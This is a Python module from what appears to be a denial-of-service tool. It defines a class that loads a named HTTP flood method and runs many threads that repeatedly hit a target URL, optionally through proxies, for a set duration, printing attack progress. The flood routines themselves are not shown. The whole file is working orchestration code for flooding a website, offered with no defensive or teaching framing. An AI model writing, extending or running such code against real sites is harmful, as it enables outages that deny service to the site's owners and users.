"""This module provides a class to instantiate DoS attacks."""

import sys
from threading import Thread
from time import sleep, time
from typing import Callable, List

from colorama import Fore  # type: ignore[import]
from humanfriendly import Spinner, format_timespan  # type: ignore[import]

from tools.crash import CriticalError  # type: ignore[import]
from tools.ip_tools import get_target_address  # type: ignore[import]


def get_method_by_name(method: str) -> Callable:
    """Get the flood function based on the attack method.

    Keyword arguments:
    method -- the method's name
    """
    dir = f"tools.L7.{method.lower()}"
    module = __import__(dir, fromlist=["object"])
    flood_function = getattr(module, "flood")
    return flood_function


class AttackMethod:
    """Control the attack's inner operations."""

    def __init__(
        self,
        method_name: str,
        duration: int,
        threads: int,
        target: str,
        use_proxy: bool,
    ):
        """Initialize the attack object.

        Keyword arguments:
        method_name -- the name of the DoS method used to attack (only HTTP GET by now)
        duration -- the duration of the attack, in seconds
        threads -- the number of threads that will attack the target
        target -- the target's URL
        use_proxy -- whether or not to use proxies
        """
        self.method_name = method_name
        self.duration = duration
        self.threads_count = threads
        self.target = target
        self.use_proxy = use_proxy
        self.threads = list()  # type: List[Thread]
        self.is_running = False

    def __enter__(self):
        """Set flood function and target's URL formatted attributes."""
        self.method = get_method_by_name(self.method_name)
        self.target = get_target_address(self.target)
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        """Do nothing, only for context manager."""
        pass

    def __run_timer(self):
        """Verify the execution time every second."""
        __stopTime = time() + self.duration
        while time() < __stopTime:
            sleep(1)
        self.is_running = False

    def __run_flood(self):
        """Start the flooder."""
        while self.is_running:
            self.method(self.target, self.use_proxy)

    def __run_threads(self):
        """Initialize the threads."""
        timing = Thread(target=self.__run_timer)
        timing.start()

        for _ in range(self.threads_count):
            thread = Thread(target=self.__run_flood)
            self.threads.append(thread)

        with Spinner(
            label=f"{Fore.YELLOW}Starting {self.threads_count} threads{Fore.RESET}",
            total=100,
        ) as spinner:
            for index, thread in enumerate(self.threads):
                thread.start()
                spinner.step(100 / len(self.threads) * (index + 1))

        for index, thread in enumerate(self.threads):
            thread.join()
            print(
                f"{Fore.GREEN}[+] {Fore.YELLOW}Thread {index + 1} stopped.{Fore.RESET}"
            )

        print(f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attack Completed!\n\n{Fore.RESET}")

    def start(self):
        """Start the DoS attack itself."""
        target = str(self.target).strip("()").replace(", ", ":").replace("'", "")
        duration = format_timespan(self.duration)
        print(
            f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attacking {target} using {self.method_name} method.{Fore.RESET}"
            f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}The attack will stop after {Fore.MAGENTA}{duration}{Fore.BLUE}.\n\n{Fore.RESET}"
        )

        self.is_running = True

        try:
            self.__run_threads()

        except KeyboardInterrupt:
            self.is_running = False
            print(
                f"{Fore.RED}\n\n[!] {Fore.MAGENTA}Ctrl+C detected. Stopping {self.threads_count} threads...\n\n{Fore.RESET}"
            )

            for thread in self.threads:
                if thread.is_alive():
                    thread.join()

            print(
                f"{Fore.MAGENTA}\n\n[!] {Fore.BLUE}Attack Interrupted!\n\n{Fore.RESET}"
            )
            sys.exit(1)

        except Exception as err:
            CriticalError("An error ocurred during the attack", err)

        else:
            return True
